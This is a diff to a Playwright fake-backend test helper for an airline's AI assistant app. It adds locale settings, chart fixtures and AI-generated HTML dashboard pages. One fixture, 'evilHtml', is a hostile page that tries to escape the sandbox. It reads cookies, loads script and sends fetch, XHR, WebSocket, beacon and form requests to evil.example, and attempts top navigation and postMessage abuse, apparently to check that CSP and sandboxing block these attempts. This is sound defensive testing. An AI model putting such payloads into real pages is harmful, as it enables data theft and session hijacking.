@@ -9,12 +9,13 @@ type Node = { id: string; kind: string; label: string; title: string | null; set
 
 export const fakeUser = {
   id: 1, name: 'Kerem B.', email: 'kerem@freebird.test', title: 'Commercial Lead', role: 'admin', avatar_color: 'crimson', is_active: true,
-  must_change_password: false, theme: 'light', last_login_at: null, department: { id: 1, name: 'Commercial', slug: 'commercial' },
+  must_change_password: false, theme: 'light', locale: 'tr', last_login_at: null, department: { id: 1, name: 'Commercial', slug: 'commercial' },
   abilities: { build: true, admin: true },
 }
 
 /** `signedIn: false` ile oturumsuz başlar; giriş ve çıkış oturumu değiştirir. */
-export function installFakeBackend(page: Page, { signedIn = true, theme = 'light', now = new Date() }: { signedIn?: boolean; theme?: 'light' | 'dark' | 'system'; now?: Date } = {}) {
+export function installFakeBackend(page: Page, options: { signedIn?: boolean; theme?: 'light' | 'dark' | 'system'; now?: Date; evilPage?: boolean; locale?: 'en' | 'tr' } = {}) {
+  const { signedIn = true, theme = 'light', now = new Date() } = options
   const catalog = JSON.parse(readFileSync(new URL('../../backend/config/kestra-catalog.json', import.meta.url), 'utf8'))
   const apps = catalog.apps.map((app: Record<string, unknown>) => ({
     ...app,
@@ -27,10 +28,12 @@ export function installFakeBackend(page: Page, { signedIn = true, theme = 'light
   const state = {
     signedIn,
     theme,
+    locale: options.locale ?? 'tr',
     conversations: [] as { id: number; title: string | null; kind: string; model: null; effective_model: string; usage: { calls: number; tokens: number; cost_usd: number }; messages: unknown[]; created_at: string; updated_at: string }[],
     version: 1,
     feedback: [] as unknown[],
     answers: [] as unknown[],
+    messagesSent: [] as unknown[],
     published: null as number | null,
     operations: [] as unknown[],
     approved: false,
@@ -39,8 +42,10 @@ export function installFakeBackend(page: Page, { signedIn = true, theme = 'light
     apmDisabled: false,
     stopped: false,
     resolved: false,
-    policies: { ai_data_access: 'masked', ai_allow_employee_names: true, allowed_models: ['claude-sonnet-5-5', 'claude-opus-5-5'], default_model: 'claude-sonnet-5-5', data_question_model: 'claude-opus-5-5', fast_model: 'claude-sonnet-5-5', budget_blocks_flow_ai_steps: false, allow_external_recipients: false, allowed_recipient_domains: ['freebird.com.tr', 'gozendigital.com'], max_tool_calls: 20, max_cost_usd: 2, max_seconds: 600 } as Record<string, unknown>,
+    policies: { ai_data_access: 'masked', ai_allow_employee_names: true, allowed_models: ['claude-sonnet-5-5', 'claude-opus-5-5'], default_model: 'claude-sonnet-5-5', data_question_model: 'claude-opus-5-5', fast_model: 'claude-sonnet-5-5', page_model: 'claude-sonnet-5-5', budget_blocks_flow_ai_steps: false, allow_external_recipients: false, allowed_recipient_domains: ['freebird.com.tr', 'gozendigital.com'], max_tool_calls: 20, max_cost_usd: 2, max_seconds: 600 } as Record<string, unknown>,
     audit: [] as { id: number; at: string; actor_type: string; actor: string | null; action: string; subject: string | null; system: string | null; result: string; cost_usd: number | null; meta: Record<string, unknown> | null }[],
+    evilPage: options.evilPage ?? false,
+    downloads: [] as string[],
     opsBudget: null as { monthly_limit_usd: number; warn_at_percent: number; hard_stop: boolean } | null,
     useful: false,
     graph: {
@@ -123,10 +128,11 @@ export function installFakeBackend(page: Page, { signedIn = true, theme = 'light
   // Grafikli cevap (sohbet grafikleri): bir line, bir hbar. Veri sunucunun doğruladığı answer.charts'tan çizilir.
   const days = Array.from({ length: 14 }, (_, i) => new Date(Date.UTC(2026, 8, 28 + i)).toISOString().slice(0, 10))
   const flightsChart = {
-    type: 'line', title: 'Günlük sefer sayısı, son 14 gün', source: 'q:q_sefer00001',
-    x: { field: 'flight_date', type: 'date', label: 'Tarih' }, y: { unit: 'adet', label: 'Sefer', min: 0 },
-    series: [{ name: 'Tarifeli', field: 'scheduled' }, { name: 'Charter', field: 'charter' }],
-    data: days.map((d, i) => ({ flight_date: d, scheduled: [152, 149, 158, 161, 155, 141, 132, 150, 156, 160, 163, 158, 145, 136][i], charter: [52, 49, 53, 54, 52, 48, 44, 51, 53, 54, 55, 54, 49, 45][i] })),
+    type: 'line', title: 'Günlük yolcu sayısı, son 14 gün', source: 'q:q_sefer00001',
+    x: { field: 'flight_date', type: 'date', label: 'Tarih' }, y: { unit: 'adet', label: 'Yolcu', min: 0 },
+    // Birbirine yakın iki seri: çizgi sonu etiketleri üst üste binmemeli.
+    series: [{ name: 'Check-in', field: 'checkin' }, { name: 'Uçağa biniş', field: 'boarded' }],
+    data: days.map((d, i) => ({ flight_date: d, checkin: [5420, 5060, 5770, 7720, 10790, 9740, 6930, 5650, 6680, 5870, 8420, 10770, 10740, 8150][i], boarded: [5290, 4920, 5600, 7240, 10540, 9250, 6420, 5500, 6360, 5730, 8200, 10330, 10290, 7900][i] })),
     reference: null, derived: false, note: 'Türkiye saatine göre.',
   }
   const reasonsChart = {
@@ -137,15 +143,15 @@ export function installFakeBackend(page: Page, { signedIn = true, theme = 'light
     reference: null, derived: false, note: null,
   }
   const chartConversation = () => {
-    const text = `Son 14 günde günlük sefer sayısı **176–218** arasında; hafta sonları belirgin düşüyor [^q:q_sefer00001].\n\n:::chart\n${JSON.stringify(flightsChart)}\n:::\n\nDünkü rötarın yarıya yakını **uçağın geç gelmesinden** (412 dk); yer hizmetleri ikinci sırada [^q:q_neden0001].\n\n:::chart\n${JSON.stringify(reasonsChart)}\n:::`
+    const text = `Son 14 günde günlük yolcu **4.920–10.790** arasında; hafta sonları belirgin yükseliyor [^q:q_sefer00001].\n\n:::chart\n${JSON.stringify(flightsChart)}\n:::\n\nDünkü rötarın yarıya yakını **uçağın geç gelmesinden** (412 dk); yer hizmetleri ikinci sırada [^q:q_neden0001].\n\n:::chart\n${JSON.stringify(reasonsChart)}\n:::`
     const queries = [
-      { tool: 'query_warehouse', source: 'IBS', purpose: 'Son 14 gün, günlük sefer sayısı', query_id: 'q_sefer00001', rows: 14, total_rows: 14, masked: false, at: now.toISOString() },
+      { tool: 'query_warehouse', source: 'IBS', purpose: 'Son 14 gün, günlük yolcu', query_id: 'q_sefer00001', rows: 14, total_rows: 14, masked: false, at: now.toISOString() },
       { tool: 'query_apm', source: 'APM', purpose: 'Dünkü rötar nedenleri', query_id: 'q_neden0001', rows: 5, total_rows: 5, masked: false, at: now.toISOString() },
     ]
     return {
       id: 20, title: 'Sefer sayısı ve rötar nedenleri', kind: 'chat', model: null, effective_model: 'claude-sonnet-5-5', usage: { calls: 3, tokens: 9000, cost_usd: 0.12 }, created_at: '', updated_at: '',
       messages: [
-        { id: 201, conversation_id: 20, role: 'user', text: 'Son 14 günün günlük sefer sayısı ve dünkü rötar nedenleri', stop_reason: null, flow_cards: [], created_at: now.toISOString() },
+        { id: 201, conversation_id: 20, role: 'user', text: 'Son 14 günün günlük yolcu sayısı ve dünkü rötar nedenleri', stop_reason: null, flow_cards: [], created_at: now.toISOString() },
         {
           id: 202, conversation_id: 20, role: 'assistant', text, stop_reason: 'end_turn', status: null, flow_cards: [], feedback: null, created_at: now.toISOString(),
           answer: { trace: [scope], queries, models: ['claude-sonnet-5-5'], model_labels: ['Claude Sonnet 5.5'], auto: true, duration_ms: 18200, steps: 1, writes: [], citation_mismatch: [], charts: [flightsChart, reasonsChart] },
@@ -153,6 +159,93 @@ export function installFakeBackend(page: Page, { signedIn = true, theme = 'light
       ],
     }
   }
+
+  // Sohbette HTML sayfa (H1): normal pano (2 grafik + filtre) ve güvenlik denemesi yapan kötü niyetli sayfa.
+  const panoData = {
+    'q:q_pano00001': {
+      source: 'APM', purpose: 'Son 7 gün, günlük sefer ve OTP', at: now.toISOString(), total_rows: 7, truncated: false,
+      columns: ['flight_date', 'flights', 'otp_pct'],
+      rows: [['2026-10-05', 54, 82.4], ['2026-10-06', 50, 79.1], ['2026-10-07', 55, 85.0], ['2026-10-08', 47, 88.2], ['2026-10-09', 59, 76.5], ['2026-10-10', 78, 81.0], ['2026-10-11', 73, 84.3]],
+    },
+    'q:q_pano00002': {
+      source: 'APM', purpose: 'Dün meydanlara göre rötar', at: now.toISOString(), total_rows: 6, truncated: false,
+      columns: ['airport', 'reason', 'minutes'],
+      rows: [['AYT', 'Uçağın geç gelmesi', 212], ['AYT', 'Yer hizmetleri', 96], ['SAW', 'Uçağın geç gelmesi', 140], ['SAW', 'Teknik', 55], ['ADB', 'Hava trafik', 61], ['ADB', 'Uçağın geç gelmesi', 60]],
+    },
+  }
+  const panoHtml = `<style>.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:16px}.card{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:12px}.kpi{font-size:28px;font-weight:600}</style>
+<h2>Operasyon panosu · son 7 gün</h2>
+<div class="grid"><div class="card"><div>Toplam sefer</div><div class="kpi" id="total"></div></div><div class="card"><div>Ortalama OTP</div><div class="kpi" id="otp"></div></div></div>
+<div class="grid" style="margin-top:16px"><div class="card"><h3>Günlük sefer</h3><canvas id="flights"></canvas></div><div class="card"><h3>Meydana göre rötar (dk)</h3><label>Meydan <select id="airport"><option value="">Hepsi</option></select></label><div id="delays"></div><div id="table"></div></div></div>
+<script>
+const days = fortis.data('q:q_pano00001');
+const delays = fortis.data('q:q_pano00002');
+document.getElementById('total').textContent = fortis.formatNumber(days.reduce((a, r) => a + r.flights, 0), 0);
+document.getElementById('otp').textContent = '%' + fortis.formatNumber(days.reduce((a, r) => a + r.otp_pct, 0) / days.length);
+fortis.chart('#flights', { type: 'line', data: { labels: days.map(r => fortis.formatDate(r.flight_date)), datasets: [{ label: 'Sefer', data: days.map(r => r.flights) }] }, options: { plugins: { legend: { display: false } } } });
+const select = document.getElementById('airport');
+[...new Set(delays.map(r => r.airport))].forEach(a => select.add(new Option(a, a)));
+let chart;
+function draw() {
+  const rows = delays.filter(r => !select.value || r.airport === select.value);
+  const byReason = {}; rows.forEach(r => byReason[r.reason] = (byReason[r.reason] || 0) + r.minutes);
+  if (chart) chart.destroy();
+  chart = fortis.chart('#delays', { type: 'bar', data: { labels: Object.keys(byReason), datasets: [{ label: 'Rötar (dk)', data: Object.values(byReason) }] }, options: { indexAxis: 'y', plugins: { legend: { display: false } } } });
+  fortis.table('#table', rows, [{ key: 'airport', label: 'Meydan' }, { key: 'reason', label: 'Neden' }, { key: 'minutes', label: 'Dakika', format: 'number' }]);
+}
+select.addEventListener('change', draw); draw();
+</script>
+<button id="ask" onclick="fortis.ask('AYT rötarlarının nedenlerini ayrıntılandır')">Fortis'e sor</button>`
+  // Sunucu temizliğinden geçmemiş gibi: CSP ve sandbox tek başına sınanır.
+  const evilHtml = `<pre id="out">bekliyor</pre>
+<script src="https://evil.example/s.js"></script>
+<link rel="prefetch" href="https://evil.example/prefetch">
+<form id="f" action="https://evil.example/form" method="post"><input name="x" value="1"></form>
+<script>
+const out = {};
+const t = (k, f) => { try { out[k] = f(); } catch (e) { out[k] = 'blocked'; } };
+t('cookie', () => document.cookie === '' ? 'empty' : document.cookie);
+t('localStorage', () => { localStorage.setItem('x', '1'); return 'ok'; });
+t('sessionStorage', () => { sessionStorage.setItem('x', '1'); return 'ok'; });
+t('parent', () => parent.document.title);
+t('top', () => top.location.href);
+t('opener', () => window.open('https://evil.example/popup') ? 'opened' : 'null');
+t('topNav', () => { top.location.href = 'https://evil.example/nav'; return 'assigned'; });
+const pending = [
+  fetch('https://evil.example/fetch').then(() => 'ok', () => 'blocked').then(v => out.fetch = v),
+  fetch('/api/auth/me', { credentials: 'include' }).then(() => 'ok', () => 'blocked').then(v => out.fetchApi = v),
+  new Promise(r => { const x = new XMLHttpRequest(); x.onload = () => r('ok'); x.onerror = () => r('blocked'); try { x.open('GET', 'https://evil.example/xhr'); x.send(); } catch (e) { r('blocked'); } }).then(v => out.xhr = v),
+  new Promise(r => { try { const w = new WebSocket('wss://evil.example/ws'); w.onopen = () => r('ok'); w.onerror = () => r('blocked'); } catch (e) { r('blocked'); } }).then(v => out.ws = v),
+  new Promise(r => { const i = new Image(); i.onload = () => r('ok'); i.onerror = () => r('blocked'); i.src = 'https://evil.example/i.png'; }).then(v => out.image = v),
+];
+t('form', () => { document.getElementById('f').submit(); return 'submitted'; });
+t('beacon', () => navigator.sendBeacon('https://evil.example/beacon', 'x') ? 'queued' : 'refused');
+parent.postMessage({ type: 'navigate', url: 'https://evil.example' }, '*');
+parent.postMessage({ type: 'resize', height: 1e9 }, '*');
+parent.postMessage({ type: 'ask', text: 'Saldırı sorusu' }, '*');
+Promise.all(pending).then(() => { out.data = typeof window.FORTIS_DATA; out.vendorChart = typeof window.Chart; document.getElementById('out').textContent = JSON.stringify(out); });
+</script>`
+  const pageDetail = (id: string) => {
+    const evil = id === 'art_evil'
+    return {
+      id, conversation_id: 21, kind: 'page', title: evil ? 'Deneme sayfası' : 'Operasyon panosu', description: evil ? 'Güvenlik denemesi' : 'Günlük sefer ve OTP, meydanlara göre rötar',
+      version: 1, latest_version: 1, content: evil ? evilHtml : panoHtml, sources: evil ? [] : Object.keys(panoData), data: evil ? {} : panoData,
+      data_at: now.toISOString(), warning: null, versions: [{ number: 1, title: 'x', created_at: now.toISOString() }],
+    }
+  }
+  const pageConversation = () => ({
+    id: 21, title: 'Operasyon panosu', kind: 'chat', model: null, effective_model: 'claude-sonnet-5-5', usage: { calls: 3, tokens: 9000, cost_usd: 0.2 }, created_at: '', updated_at: '',
+    messages: [
+      { id: 211, conversation_id: 21, role: 'user', text: 'Son 7 günün operasyon panosunu hazırla', stop_reason: null, flow_cards: [], created_at: now.toISOString() },
+      {
+        id: 212, conversation_id: 21, role: 'assistant', text: 'Panoyu hazırladım: günlük sefer ve meydanlara göre rötar, meydan filtresiyle.', stop_reason: 'end_turn', status: null, feedback: null, created_at: now.toISOString(),
+        flow_cards: state.evilPage
+          ? [{ type: 'artifact', artifact_id: 'art_evil', version: 1, title: 'Deneme sayfası', kind: 'page', description: 'Güvenlik denemesi', sources: [], data_at: now.toISOString(), warning: null }]
+          : [{ type: 'artifact', artifact_id: 'art_pano', version: 1, title: 'Operasyon panosu', kind: 'page', description: 'Günlük sefer ve OTP, meydanlara göre rötar', sources: Object.keys(panoData), data_at: now.toISOString(), warning: null }],
+        answer: null,
+      },
+    ],
+  })
 
   const inboxItem = () => ({
     id: 1, type: 'approval', title: 'Sigorta bildirimi', body: 'occ@freebird.com.tr adresine gönderilecek e-posta onay bekliyor.', source_label: 'Sabah Operasyon Özeti',
@@ -180,7 +273,7 @@ export function installFakeBackend(page: Page, { signedIn = true, theme = 'light
     error: null, cost_usd: 0.214, conversation_id: 80, started_at: now.toISOString(), finished_at: now.toISOString(),
     actions: [{ id: 1, type: 'send_email', status: 'preview', requires_approval: true, payload: { to: ['kerem@freebird.com.tr'], subject: 'Operasyon özeti · 11 Eki' }, reason: null }],
   })
-  const zeroTypes = { chat: 0, agent: 0, title: 0, evaluation: 0, eval: 0, flow: 0 }
+  const zeroTypes = { chat: 0, agent: 0, page: 0, title: 0, evaluation: 0, eval: 0, flow: 0 }
   const usageReport = () => ({
     range: { from: '2026-10-01', to: '2026-10-11' },
     totals: { calls: 412, cost_usd: 18.42, input_tokens: 2_310_000, output_tokens: 96_400 },
@@ -370,20 +463,22 @@ export function installFakeBackend(page: Page, { signedIn = true, theme = 'light
     const path = url.pathname.replace(/^\/api/, '')
     const method = route.request().method()
 
-    if (path === '/auth/config') return json(route, { data: { driver: 'password', locale: 'tr' } })
+    if (path === '/auth/config') return json(route, { data: { driver: 'password', locale: state.locale } })
     if (path === '/auth/login') {
       state.signedIn = true
       return json(route, { data: { ...fakeUser, theme: state.theme } })
     }
     if (!state.signedIn) return json(route, { message: 'Unauthenticated.' }, 401)
-    if (path === '/auth/me') return json(route, { data: { ...fakeUser, theme: state.theme } })
+    if (path === '/auth/me') return json(route, { data: { ...fakeUser, theme: state.theme, locale: state.locale } })
     if (path === '/auth/logout') {
       state.signedIn = false
       return route.fulfill({ status: 204 })
     }
     if (path === '/me/preferences') {
-      state.theme = route.request().postDataJSON().theme
-      return json(route, { data: { ...fakeUser, theme: state.theme } })
+      const body = route.request().postDataJSON()
+      if (body.theme) state.theme = body.theme
+      if (body.locale) state.locale = body.locale
+      return json(route, { data: { ...fakeUser, theme: state.theme, locale: state.locale } })
     }
     if (path === '/home') {
       return json(route, { data: { greeting_name: 'Kerem', waiting_total: state.approved ? 0 : 1, suggestions: [
@@ -463,6 +558,7 @@ export function installFakeBackend(page: Page, { signedIn = true, theme = 'light
     }
     if (/^\/conversations\/\d+\/messages$/.test(path)) {
       const body = route.request().postDataJSON()
+      state.messagesSent.push(body)
       return route.fulfill({ status: 200, contentType: 'text/event-stream', body: body.answer ? answerStream(body) : questionStream(body.content) })
     }
     if (/^\/conversations\/\d+$/.test(path) && method === 'PATCH') {
@@ -475,6 +571,12 @@ export function installFakeBackend(page: Page, { signedIn = true, theme = 'light
     }
     if (path === '/conversations') return json(route, { data: state.conversations })
     if (path === '/conversations/20') return json(route, { data: chartConversation() })
+    if (path === '/conversations/21') return json(route, { data: pageConversation() })
+    if (path === '/artifacts/art_pano' || path === '/artifacts/art_evil') return json(route, { data: pageDetail(path.split('/')[2]) })
+    if (/^\/artifacts\/art_\w+\/downloaded$/.test(path)) {
+      state.downloads.push(path)
+      return json(route, { data: { ok: true } })
+    }
     if (path === '/conversations/70') return json(route, { data: { id: 70, title: 'Architect', kind: 'architect', model: null, effective_model: 'claude-sonnet-5-5', usage: { calls: 0, tokens: 0, cost_usd: 0 }, messages: [], created_at: '', updated_at: '' } })
     if (/^\/conversations\/\d+$/.test(path) && path !== '/conversations/5') return json(route, { data: state.conversations.find((c) => `/conversations/${c.id}` === path) })
     if (path === '/flows') return json(route, { data: [], unmanaged: [], kestra_error: null })
